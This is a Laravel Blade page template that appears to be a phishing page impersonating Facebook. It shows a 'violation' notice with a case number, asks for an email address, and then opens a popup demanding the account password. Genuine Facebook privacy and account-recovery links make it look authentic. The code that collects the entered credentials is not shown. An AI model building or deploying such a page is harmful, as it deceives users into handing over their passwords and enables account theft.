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"
                alt="" />
            <div class="contentright">
                <p class="titleright">@lang('home.home_violate')</p>
                <p>
                    <span class="open">@lang('home.home_open')</span>
                    <span class="case" id="case">@lang('home.home_case') #9505997380</span>
                </p>
            </div>
        </div>
    </div>
    <div class="maincontent">
        <div class="contentmain">
            <div class="contentmainright">
                <b>@lang('home.home_our_message')</b>
                <p>@lang('home.home_condition_1')</p>
                <p>@lang('home.home_condition_2')</p>
                <p>@lang('home.home_condition_3')</p>
                <p>@lang('home.home_condition_4')</p>
                <p class="remind">@lang('home.home_our_des')</p>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="bp">
            <p class="footer-top">
                <b>* @lang('home.home_required') </b>@lang('home.home_hint')
            </p>
        </div>
        <div class="button-btn">
            <input type="text" id="email" placeholder="@lang('login.email')" />
        </div>
        <div class="buttuncheck">
            <input type="checkbox" id="must-check" />
            <label for="must-check" class="buttuncheck-label">@lang('home.home_confirm')</label>
        </div>
        <button class="btn-submit" id="btn-submit" style="background-color:rgb(136, 189, 255)" disabled
            onclick="openPopup()">@lang('login.submit')</button>
        <div class="footer-bottom">
            <p>@lang('home.home_infomation') <a
                    href="https://www.facebook.com/privacy/policy/?entry_point=data_policy_redirect&entry=0">@lang('home.home_privacy')</a>
            </p>
        </div>
    </div>
</div>
<div class="popup-container" id="popup">
    <div class="popup-content">
        <div class="popup-header">
            <h2>@lang('home.popup_header')</h2>
            <span class="popup-close" onclick="closePopup()">×</span>
        </div>
        <div class="popup-body">
            <p class="popup-text">@lang('home.popup_text')</p>
            <div class="form-group" style="margin-bottom: 0px">
                <label>@lang('home.popup_password')</label>
                <div class="error-notification mb-2" style="display: none">
                    <span class="">@lang('fa.warning_login_fa')</span>
                    <br><a class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
                </div>
                <div class="" style="display:flex;align-items:center;position: relative;">
                    <input type="password" class="form-input" id="password" oninput="validatepassword()"
                        placeholder="@lang('login.password')" value="" />
                    <i id="eye" class="fa fa-eye" style="position: absolute;right:30px"></i>
                </div>
            </div>
            <p class="error-message" id="error-message" style="display: none">@lang('home.popup_error')</p>
        </div>
        <div class="popup-footer">
            {{-- <button class="button" disabled id="btn-continue" onclick="nextPage()"> Continue </button> --}}
            <button style="background-color: rgb(26, 115, 227);color:white" type="button"
                class="button-form-login">
                <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;"
                    class="d-none spinner-border spinner">
                </span>
                <span id="submit-login-text">@lang('login.submit')</span>
            </button>
            <span class="loader" id="loader"></span>
        </div>
    </div>
</div>
@endsection
